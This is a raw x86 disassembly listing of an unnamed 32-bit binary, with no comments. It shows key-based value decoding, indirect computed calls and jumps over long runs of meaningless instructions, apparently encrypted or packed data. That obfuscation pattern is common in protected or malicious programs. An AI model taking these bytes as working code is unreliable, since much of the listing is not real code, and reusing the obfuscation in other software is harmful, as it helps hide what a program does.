  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	data16 inc BYTE PTR [ecx]
  415961:	sbb    BYTE PTR [ebp+0x10],ch
  415964:	jg     0x4159de
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415960
  41596b:	in     al,0x89
  41596d:	add    dl,BYTE PTR [edi]
  41596f:	mov    ecx,0x83ac8a31
  415974:	dec    ebp
  415975:	dec    edx
  415976:	rcr    DWORD PTR [ecx+0x23],1
  415979:	in     al,0x9e
  41597b:	out    dx,eax
  41597c:	or     al,0xf
  41597e:	cmp    ecx,DWORD PTR [ebp-0x3b8833b2]
  415984:	aaa    
  415985:	fcmovu st,st(2)
  415987:	aam    0x17
  415989:	adc    al,0x22
  41598b:	xchg   esi,eax
  41598c:	jae    0x41594f
  41598e:	sar    BYTE PTR [edi-0x5ab05ee0],0xbc
  415995:	iret   
  415996:	sub    edi,0x34a715a8
  41599c:	adc    al,0x36
  41599e:	inc    eax
  41599f:	aas    
  4159a0:	dec    edx
  4159a1:	lock mov esp,DWORD PTR fs:[edx+0x6f1bd772]
  4159a9:	cmc    
  4159aa:	adc    al,0xb7
  4159ac:	and    eax,0xdf140f22
  4159b1:	(bad)  
  4159b2:	cld    
  4159b3:	nop
  4159b4:	lea    edx,[edi]
  4159b6:	push   ebx
  4159b7:	or     edi,DWORD PTR [ecx]
  4159b9:	bound  esi,QWORD PTR [ebp+0x75d9b1b5]
  4159bf:	or     eax,0xa115ece
  4159c4:	sbb    cl,cl
  4159c6:	ins    DWORD PTR es:[edi],dx
  4159c7:	sbb    ebp,DWORD PTR cs:[esi+edx*2-0x40]
  4159cc:	sbb    BYTE PTR [esi+esi*4-0x11],0x1e
  4159d1:	sub    dh,BYTE PTR ds:0x4d2b4571
  4159d7:	push   ebp
  4159d8:	and    al,BYTE PTR [ebx+0x36]
  4159db:	shl    DWORD PTR [edx+0x348c34eb],0x44
  4159e2:	adc    eax,0x66e02ea
  4159e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e8:	std    
  4159e9:	jp     0x4159b4
  4159eb:	pop    ds
  4159ec:	outs   dx,BYTE PTR ds:[esi]
  4159ed:	push   edi
  4159ee:	sub    bh,BYTE PTR [esi-0x69843629]
  4159f4:	test   eax,0xd260e1b1
  4159f9:	fs jo  0x415982
  4159fc:	push   edi
  4159fd:	das    
  4159fe:	jmp    0x363ed64c
  415a03:	mov    eax,DWORD PTR [ecx+0x41e4ace1]
  415a09:	jge    0x415a82
  415a0b:	(bad)  
  415a0c:	cld    
  415a0d:	mov    al,0x6b
  415a0f:	xchg   BYTE PTR [esp+ebp*8-0x8ff0799],dl
  415a16:	(bad)  
  415a17:	cld    
  415a18:	jbe    0x4159ed
  415a1a:	or     eax,0x8db96d87
  415a1f:	retf   0x553
  415a22:	sahf   
  415a23:	mov    eax,0xf2237f9e
  415a28:	dec    edx
  415a29:	cmp    BYTE PTR [esi+0x57882daf],ah
  415a2f:	dec    esp
  415a30:	ins    BYTE PTR es:[edi],dx
  415a31:	ins    BYTE PTR es:[edi],dx
  415a32:	xor    BYTE PTR [edx],0xdc
  415a35:	ins    BYTE PTR es:[edi],dx
  415a36:	out    0x36,al
  415a38:	pop    ebp
  415a39:	cmc    
  415a3a:	(bad)  [ebp+eax*4+0x1d]
  415a3e:	or     DWORD PTR [esi+0x7ee86aa],ebp
  415a44:	ja     0x415aab
  415a46:	fmul   DWORD PTR [esp+eiz*4]
  415a49:	and    eax,0x97e3eca8
  415a4e:	mov    ?,ebx
  415a50:	aad    0xc3
  415a52:	and    eax,0x2e2c5fb5
  415a57:	inc    esp
  415a58:	(bad)  
  415a59:	pop    esi
  415a5a:	dec    edx
  415a5b:	and    BYTE PTR [esi-0x5f],0xc4
  415a5f:	or     al,0x31
  415a61:	into   
  415a62:	out    dx,eax
  415a63:	rol    BYTE PTR [edx-0x59],1
  415a66:	and    esp,ecx
  415a68:	xlat   BYTE PTR ss:[ebx]
  415a6a:	js     0x415aa9
  415a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6d:	and    eax,0x4c93bfbc
  415a72:	(bad)  
  415a73:	movsx  edi,BYTE PTR [esi]
  415a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a77:	inc    eax
  415a78:	fild   QWORD PTR [ecx-0x45eb6ac0]
  415a7e:	fwait
  415a7f:	mov    ah,BYTE PTR [esi-0x9]
  415a82:	dec    edi
  415a83:	push   ebp
  415a84:	fwait
  415a85:	mov    dl,0xe5
  415a87:	shl    BYTE PTR [ecx-0x4621338d],cl
  415a8d:	out    0xe3,eax
  415a8f:	shl    DWORD PTR [ebx],1
  415a91:	mov    ds:0x93e35eca,al
  415a96:	ins    DWORD PTR es:[edi],dx
  415a97:	jp     0x415a55
  415a99:	jl     0x415ab1
  415a9b:	mov    esi,0x58d6edbf
  415aa0:	(bad)  
  415aa1:	mov    edi,0xcc121edb
  415aa6:	fadd   st(6),st
  415aa8:	out    0xa0,eax
  415aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aab:	inc    edi
  415aac:	cs dec edi
  415aae:	xlat   BYTE PTR ds:[ebx]
  415aaf:	adc    edi,DWORD PTR [edx+ebx*8]
  415ab2:	sbb    BYTE PTR [ecx],al
  415ab4:	xor    al,BYTE PTR [edi+0x1d]
  415ab7:	retf   
  415ab8:	lods   eax,DWORD PTR ds:[esi]
  415ab9:	xor    BYTE PTR [ebp+0x65],0x53
  415abd:	fstp   DWORD PTR [esi+0x1ef094a1]
  415ac3:	sub    DWORD PTR [esp+eiz*8],edx
  415ac6:	test   DWORD PTR [edi+0x7612d111],ebp
  415acc:	mov    ds:0xc27ab859,al
  415ad1:	out    dx,al
  415ad2:	xchg   edx,eax
  415ad3:	mov    edx,DWORD PTR [edx+0x3ab6a8c4]
  415ad9:	jecxz  0x415a68
  415adb:	lods   eax,DWORD PTR ds:[esi]
  415adc:	ret    
  415add:	xchg   esp,eax
  415ade:	mov    es,WORD PTR ds:0xafb6a613
  415ae4:	rol    BYTE PTR [eax+edx*1],cl
  415ae7:	mov    edi,0x9d1a355a
  415aec:	addr16 xchg edx,eax
  415aee:	cmp    ebx,DWORD PTR [edx-0x7e1c07e5]
  415af4:	fsubr  QWORD PTR [edi+0x59bf228a]
  415afa:	ss cbw 
  415afd:	outs   dx,BYTE PTR ds:[esi]
  415afe:	cmp    BYTE PTR [edx-0x40],cl
  415b01:	aad    0x0
  415b03:	add    al,0x8b
  415b05:	xor    bh,BYTE PTR [edx+0x4443d18a]
  415b0b:	pop    ebp
  415b0c:	mov    ebx,0xbfe1c4ed
  415b11:	frstor [edi-0x55]
  415b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b15:	mov    bl,BYTE PTR [ebx+0x20]
  415b18:	or     BYTE PTR [ebx-0x5e],0xe5
  415b1c:	nop
  415b1d:	repz cmp eax,DWORD PTR [eax+0x6]
  415b21:	add    al,0x40
  415b23:	or     al,cl
  415b25:	int    0xb
  415b27:	push   ss
  415b28:	xor    edi,DWORD PTR [eax+0x12]
  415b2b:	dec    ebp
  415b2c:	add    ebp,DWORD PTR [ebp+0x7aa2086b]
  415b32:	outs   dx,BYTE PTR ds:[esi]
  415b33:	loop   0x415b40
  415b35:	jecxz  0x415abb
  415b37:	std    
  415b38:	xchg   DWORD PTR [esi-0x19],edx
  415b3b:	addr16 int 0xa2
  415b3e:	jl     0x415b99
  415b40:	push   ss
  415b41:	and    al,0x7c
  415b43:	dec    ebp
  415b44:	in     eax,dx
  415b45:	mov    dl,0x10
  415b47:	scas   eax,DWORD PTR es:[edi]
  415b48:	inc    ebp
  415b49:	pop    eax
  415b4a:	adc    al,0xfa
  415b4c:	(bad)
  415b4f:	xor    cl,ch
  415b51:	push   0x72098d47
  415b56:	ins    DWORD PTR es:[edi],dx
  415b57:	in     al,0xde
  415b59:	adc    dh,bl
  415b5b:	and    eax,0xd00fc7e
  415b60:	fmulp  st(2),st
  415b62:	scas   al,BYTE PTR es:[edi]
  415b63:	sbb    edx,ebp
  415b65:	iret   
  415b66:	xor    al,0x2d
  415b68:	popf   
  415b69:	outs   dx,BYTE PTR ds:[esi]
  415b6a:	sub    al,0xf4
  415b6c:	adc    eax,0xbf0a3312
  415b71:	cmp    ebx,esi
  415b73:	fisub  DWORD PTR [eax-0x7f]
  415b76:	or     al,al
  415b78:	cmp    al,0x7c
  415b7a:	cmp    ebx,eax
  415b7c:	and    al,0xd7
  415b7e:	push   esi
  415b7f:	mov    cl,0x88
  415b81:	stc    
  415b82:	fiadd  DWORD PTR [ecx]
  415b84:	push   eax
  415b85:	pop    ss
  415b86:	stc    
  415b87:	jecxz  0x415bff
  415b89:	fmul   QWORD PTR [ebp-0x2642e0cc]
  415b8f:	(bad)  
  415b90:	repz jecxz 0x415b19
  415b93:	jae    0x415c0f
  415b95:	mov    bh,0x8f
  415b97:	test   DWORD PTR [edi+edi*1-0x3f8fd331],0x23c3fdf5
  415ba2:	jne    0x415b63
  415ba4:	ds loop 0x415b58
  415ba7:	lahf   
  415ba8:	fcomp  st(3)
  415baa:	inc    edi
  415bab:	push   es
  415bac:	dec    edx
  415bad:	outs   dx,DWORD PTR ds:[esi]
  415bae:	adc    eax,DWORD PTR [ebp-0xa55a1a]
  415bb4:	in     eax,dx
  415bb5:	test   ecx,edx
  415bb7:	sub    dh,ah
  415bb9:	sahf   
  415bba:	mov    esp,0x40393c5
  415bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bc0:	rcl    cl,0xf6
  415bc3:	or     DWORD PTR [ebp+0x5c7e1694],esp
  415bc9:	(bad)  
  415bca:	in     al,dx
  415bcb:	fstp   QWORD PTR [edi-0x46]
  415bce:	arpl   WORD PTR [edx+0x7],di
  415bd1:	clc    
  415bd2:	mov    ds:0x618c4e6f,eax
  415bd7:	mov    esp,es
  415bd9:	call   DWORD PTR [esi]
  415bdb:	and    al,0xb5
  415bdd:	out    0x7b,eax
  415bdf:	jmp    0x415be3
  415be1:	(bad)  [edi-0x2f]
  415be4:	sub    ebp,DWORD PTR [eax-0x15]
  415be7:	lds    edx,FWORD PTR [eax+ebx*2-0x76771a41]
  415bee:	jns    0x415c2d
  415bf0:	dec    esi
  415bf1:	inc    edi
  415bf2:	xchg   DWORD PTR [ebx+0x3d1d8377],esi
  415bf8:	cld    
  415bf9:	adc    edi,ecx
  415bfb:	mov    WORD PTR [edi-0x3b46c244],ss
  415c01:	arpl   cx,si
  415c03:	cvtps2pd xmm2,QWORD PTR [ecx+0x51]
  415c07:	mov    DWORD PTR ds:0x42a815,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7d9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a89d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	dec    esi
  415c40:	jmp    0x415c9a
  415c42:	jl     0x415bce
  415c44:	adc    eax,0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	cld    
  415c4c:	shl    BYTE PTR cs:[edi],0xef
  415c50:	inc    ebp
  415c51:	jno    0x415cc3
  415c53:	out    0x79,eax
  415c55:	add    esi,DWORD PTR [ebx]
  415c57:	mov    ah,0x56
  415c59:	test   BYTE PTR [edx],al
  415c5b:	jno    0x415ccf
  415c5d:	addr16 sub al,0xbc
  415c60:	dec    eax
  415c61:	fadd   DWORD PTR [edx+eax*1]
  415c64:	gs daa 
  415c66:	cld    
  415c67:	inc    esp
  415c68:	call   0xbdc7:0x9330f04f
  415c6f:	clc    
  415c70:	cmp    eax,0x58f24efc
  415c75:	sbb    dh,BYTE PTR [esi-0x2dddf798]
  415c7b:	fldcw  WORD PTR [edi-0x65]
  415c7e:	mov    eax,ds:0x38bfa9b
  415c83:	inc    eax
  415c84:	ror    BYTE PTR [eax],0x7c
  415c87:	sub    al,0x7b
  415c89:	in     al,0xb6
  415c8b:	push   cs
  415c8c:	shl    ah,cl
  415c8e:	pop    esi
  415c8f:	popa   
  415c90:	shl    edi,0x11
  415c93:	dec    ebx
  415c94:	adc    DWORD PTR [edx],ebp
  415c96:	mov    cl,0xdf
  415c98:	xchg   edi,eax
  415c99:	jl     0x415c7c
  415c9b:	push   0x43
  415c9d:	repnz rol BYTE PTR ds:0xf6886922,1
  415ca4:	mov    al,0xbe
  415ca6:	push   cs
  415ca7:	dec    edx
  415ca8:	out    dx,eax
  415ca9:	jne    0x415cf9
  415cab:	pusha  
  415cac:	stos   DWORD PTR es:[edi],eax
  415cad:	inc    esp
  415cae:	and    bl,cl
  415cb0:	iret   
  415cb1:	or     esi,ecx
  415cb3:	ds jae 0x415c53
  415cb6:	push   cs
  415cb7:	rol    edx,0xb4
  415cba:	and    edx,DWORD PTR ds:0x5688e258
  415cc0:	inc    ebp
  415cc1:	cmc    
  415cc2:	fld    DWORD PTR [edi]
  415cc4:	test   BYTE PTR [esi-0x3c75d7f4],ah
  415cca:	xor    DWORD PTR [ebx+0xe587442],0xffffffd4
  415cd1:	inc    edx
  415cd2:	dec    esi
  415cd3:	mul    DWORD PTR [ebp-0x11f6645b]
  415cd9:	mov    ch,0x2c
  415cdb:	inc    edi
  415cdc:	xchg   esp,eax
  415cdd:	sub    DWORD PTR [ecx+ebp*2-0x2f0e6398],esp
  415ce4:	sbb    eax,0xbbaaa406
  415ce9:	ret    
  415cea:	sub    al,0x61
  415cec:	push   edi
  415ced:	dec    ebx
  415cee:	int    0xf9
  415cf0:	fst    st(3)
  415cf2:	and    bh,BYTE PTR [ebx]
  415cf4:	in     al,0xa4
  415cf6:	and    BYTE PTR [ebx-0x10],ch
  415cf9:	sbb    BYTE PTR ds:0x7a876db9,0x46
  415d00:	jnp    0x415ce2
  415d02:	fs pop ss
  415d04:	sub    bl,BYTE PTR [esi+0x7b806a22]
  415d0a:	repz retf 0x583d
  415d0e:	lahf   
  415d0f:	outs   dx,BYTE PTR ds:[esi]
  415d10:	retf   0x287e
  415d13:	scas   al,BYTE PTR es:[edi]
  415d14:	shl    DWORD PTR ds:0xe11161d4,1
  415d1a:	in     eax,dx
  415d1b:	sti    
  415d1c:	and    BYTE PTR [eax-0x7cd9702f],cl
  415d22:	repnz dec edi
  415d24:	pop    eax
  415d25:	call   DWORD PTR [esi+0x5b6778f]
  415d2b:	fwait
  415d2c:	jbe    0x415d0b
  415d2e:	sub    eax,0x3d2c177c
  415d33:	fwait
  415d34:	fwait
  415d35:	jmp    0x8b1ace61
  415d3a:	jb     0x415daf
  415d3c:	ror    ecx,1
  415d3e:	or     ecx,DWORD PTR [edi]
  415d40:	jno    0x415d98
  415d42:	(bad)  [esi]
  415d44:	fisub  WORD PTR [esi+0x73c14d79]
  415d4a:	fimul  WORD PTR [eax*1+0x6d08b259]
  415d51:	adc    al,0x1c
  415d53:	mov    edx,0xdd21ae1f
  415d58:	rcl    DWORD PTR [edx+0x49],0x8c
  415d5c:	xchg   DWORD PTR [edi],esp
  415d5e:	jg     0x415ce3
  415d60:	fwait
  415d61:	and    DWORD PTR [ebp+0x692e87d],0x54
  415d68:	sub    esp,DWORD PTR [eax-0x4d]
  415d6b:	cmc    
  415d6c:	jo     0x415d01
  415d6e:	retf   0xd45f
  415d71:	mov    cl,0x13
  415d73:	mov    bl,0xfe
  415d75:	mov    eax,ds:0x777b380d
  415d7a:	imul   ebp,DWORD PTR [edi+edx*8],0xffffffd4
  415d7e:	push   ebp
  415d7f:	xlat   BYTE PTR ds:[ebx]
  415d80:	call   0xeb71:0x9d993b20
  415d87:	jg     0x415d7e
  415d89:	cmp    eax,esp
  415d8b:	lea    ebp,[edi]
  415d8d:	dec    ecx
  415d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d8f:	jb     0x415df8
  415d91:	dec    ebx
  415d92:	mov    ah,0x53
  415d94:	stos   DWORD PTR es:[edi],eax
  415d95:	shl    BYTE PTR [ebp-0x6f],1
  415d98:	mov    bl,BYTE PTR [ebx-0x47afa593]
  415d9e:	mov    ah,0xc7
  415da1:	fnstsw WORD PTR [eax+0x29]
  415da4:	push   ebx
  415da5:	out    0x71,eax
  415da7:	fidiv  WORD PTR [ebx-0x5008aae8]
  415dad:	adc    dh,BYTE PTR [ebx-0x1688715d]
  415db3:	push   edx
  415db4:	push   esp
  415db5:	pop    esp
  415db6:	repz xor cl,bh
  415db9:	adc    eax,0xf6df66c9
  415dbe:	push   es
  415dbf:	ins    BYTE PTR es:[edi],dx
  415dc0:	ja     0x415dd8
  415dc2:	inc    eax
  415dc3:	xor    BYTE PTR [ebx+0x3c5bf8bb],0xa2
  415dca:	lea    eax,[edi-0x51303906]
  415dd0:	jg     0x415e26
  415dd2:	cmp    al,0x28
  415dd4:	pop    edx
  415dd5:	icebp  
  415dd6:	xor    al,0x79
  415dd8:	jle    0x415d96
  415dda:	and    eax,0x24bed0f0
  415ddf:	inc    edx
  415de0:	mov    DWORD PTR [ebp-0x76cb206c],eax
  415de6:	mov    edx,ecx
  415de8:	push   es
  415de9:	pushf  
  415dea:	sub    DWORD PTR [ecx-0x66badb2a],edx
  415df0:	call   0x8010:0xff1d3d29
  415df7:	lds    ebp,FWORD PTR [edx]
  415df9:	sub    BYTE PTR [ebp+0x22],al
  415dfc:	xchg   BYTE PTR [ecx+0x6b8f1ab1],bl
  415e02:	or     BYTE PTR [esi+0x6774bb4e],cl
  415e08:	jmp    0xb6db:0xc70d9ce0
  415e0f:	fucomi st,st(2)
  415e11:	jl     0x415de3
  415e13:	mov    dl,BYTE PTR [ecx+0x549eae2c]
  415e19:	test   DWORD PTR [edi+0xa],edx
  415e1c:	push   es
  415e1d:	adc    esp,esi
  415e1f:	gs leave 
  415e21:	scas   eax,DWORD PTR es:[edi]
  415e22:	xchg   ch,cl
  415e24:	inc    ecx
  415e25:	mov    bh,BYTE PTR [edi]
  415e27:	sub    ch,0xe8
  415e2a:	mov    esp,0x7f2e7c6d
  415e2f:	add    ebx,ebp
  415e31:	bound  ecx,QWORD PTR [esi]
  415e33:	popa   
  415e34:	xor    cl,bl
  415e36:	inc    ebp
  415e37:	loope  0x415dea
  415e39:	xchg   esi,eax
  415e3a:	jb     0x415e02
  415e3c:	test   al,0x91
  415e3e:	cld    
  415e3f:	std    
  415e40:	shl    DWORD PTR [edi+0x1f3140dc],0x40
  415e47:	ss pop edi
  415e49:	jne    0x415e42
  415e4b:	nop
  415e4c:	ins    DWORD PTR es:[edi],dx
  415e4d:	ror    DWORD PTR [ebx-0x43],1
  415e50:	bnd jne 0x415e17
  415e53:	push   0xffffffb5
  415e55:	icebp  
  415e56:	ss jle 0x415e6b
  415e59:	fistp  QWORD PTR [eax+0x55f5952f]
  415e5f:	dec    ebp
  415e60:	add    al,0x68
  415e62:	std    
  415e63:	xchg   ecx,eax
  415e64:	mov    edx,0xa226a9dc
  415e69:	nop
  415e6a:	cmp    al,ah
  415e6c:	cmp    eax,0xf3482411
  415e71:	loop   0x415e72
  415e73:	js     0x415ec2
  415e75:	sub    al,0xed
  415e77:	frstor [edi+edi*4]
  415e7a:	je     0x415e8d
  415e7c:	mov    dh,0x18
  415e7e:	mov    ds:0x6ca9a6f0,al
  415e83:	push   ebp
  415e84:	int    0x88
  415e86:	inc    esp
  415e87:	jg     0x415ec0
  415e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e8a:	fwait
  415e8b:	add    bh,ah
  415e8d:	add    bl,BYTE PTR [edx+0x67cec9c5]
  415e93:	mov    eax,ds:0x8db364cb
  415e98:	lds    ecx,FWORD PTR [edx]
  415e9a:	xchg   BYTE PTR [ecx+0x1ee59ce8],dl
  415ea0:	pop    edi
  415ea1:	(bad)  
  415ea3:	adc    bl,bl
  415ea5:	call   0xaedb:0x585d7617
  415eac:	mov    ch,0xd4
  415eae:	fs (bad) 
  415eb1:	dec    edi
  415eb2:	scas   al,BYTE PTR es:[edi]
  415eb3:	pop    ecx
  415eb4:	xchg   edi,edi
  415eb6:	int3   
  415eb7:	fcmovne st,st(5)
  415eb9:	mov    ah,0xf0
  415ebb:	push   edi
  415ebc:	lahf   
  415ebd:	iret   
  415ebe:	iret   
  415ebf:	xchg   edi,eax
  415ec0:	jecxz  0x415f35
  415ec2:	das    
  415ec3:	fnstsw WORD PTR [ecx+0x50]
  415ec6:	fsubr  QWORD PTR [edi]
  415ec8:	das    
  415ec9:	mov    edi,0x56ba40f7
  415ece:	imul   edx,DWORD PTR [ecx+0x54],0x64dacb30
  415ed5:	in     eax,dx
  415ed6:	clc    
  415ed7:	repz jl 0x415e8f
  415eda:	neg    BYTE PTR [ebx+0x59abb0e1]
  415ee0:	repz cld 
  415ee2:	xchg   ecx,eax
  415ee3:	lds    edi,FWORD PTR [edx-0x7ba7604]
  415ee9:	mov    DWORD PTR ds:0x42a79d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a821,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a825,0x42a7e1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	sub    dh,BYTE PTR [eax-0x2f]
  415f4d:	mov    DWORD PTR [edi],esp
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f34
  415f57:	xchg   ecx,eax
  415f58:	cmp    BYTE PTR [ecx-0x50],bl
  415f5b:	pop    ebp
  415f5c:	lea    edi,[ebp-0x2]
  415f5f:	daa    
  415f60:	dec    edi
  415f61:	pusha  
  415f62:	lods   eax,DWORD PTR ds:[esi]
  415f63:	mov    esp,0x7a4ca541
  415f68:	dec    ebx
  415f69:	pop    esp
  415f6a:	pop    ss
  415f6b:	inc    edi
  415f6c:	aam    0x46
  415f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f6f:	js     0x415feb
  415f71:	push   eax
  415f72:	outs   dx,BYTE PTR ds:[esi]
  415f73:	mov    bh,0x8e
  415f75:	fldcw  WORD PTR [esi+0x328b5fe7]
  415f7b:	or     ah,0xa0
  415f7e:	adc    edx,ebp
  415f80:	dec    esp
  415f81:	jle    0x415f22
  415f83:	loop   0x415f5a
  415f85:	push   edi
  415f86:	pop    ebp
  415f87:	enter  0x91a7,0xc8
  415f8b:	xchg   esi,eax
  415f8c:	cmp    dl,BYTE PTR [edi+0xb]
  415f8f:	pop    ss
  415f90:	jl     0x415f89
  415f92:	jae    0x415f5a
  415f94:	daa    
  415f95:	add    DWORD PTR [ebx+0x4f],edi
  415f98:	xor    dh,dl
  415f9a:	jmp    0x415f95
  415f9c:	(bad)  [esi-0x819f6a6]
  415fa2:	mov    dh,0xc0
  415fa4:	add    al,0x29
  415fa6:	rcr    cl,0x78
  415fa9:	dec    ebp
  415faa:	pop    esp
  415fab:	imul   ebx,DWORD PTR [ecx],0x82fd983f
  415fb1:	les    edi,FWORD PTR [ecx]
  415fb3:	sbb    ah,BYTE PTR [esi+0x20]
  415fb6:	fstp   QWORD PTR [ebp+0x60d76026]
  415fbc:	or     eax,0xd9286258
  415fc1:	jno    0x415fb5
  415fc3:	pop    eax
  415fc4:	dec    ecx
  415fc5:	mov    esp,ecx
  415fc7:	mov    esp,0x4ec28008
  415fcc:	mov    BYTE PTR [ebx+0x8],dl
  415fcf:	ds aaa 
  415fd1:	dec    ecx
  415fd2:	jns    0x415fa0
  415fd4:	add    ecx,DWORD PTR [eax-0x36625bcf]
  415fda:	rcr    BYTE PTR gs:[edx+0x4a],1
  415fde:	cmp    BYTE PTR [esi-0x4a],ah
  415fe1:	jns    0x415f7b
  415fe3:	sbb    bl,BYTE PTR [ebx]
  415fe5:	mov    eax,ds:0x7a0cb108
  415fea:	pushf  
  415feb:	and    al,ah
  415fed:	(bad)  
  415fee:	std    
  415fef:	popa   
  415ff0:	mov    eax,es:0xc0c8673b
  415ff6:	inc    esp
  415ff7:	mov    ds:0x415c1161,al
  415ffc:	inc    edi
  415ffd:	nop
  415ffe:	(bad)  
  415fff:	cld    
  416000:	push   eax
  416001:	hlt    
  416002:	mov    ah,0xad
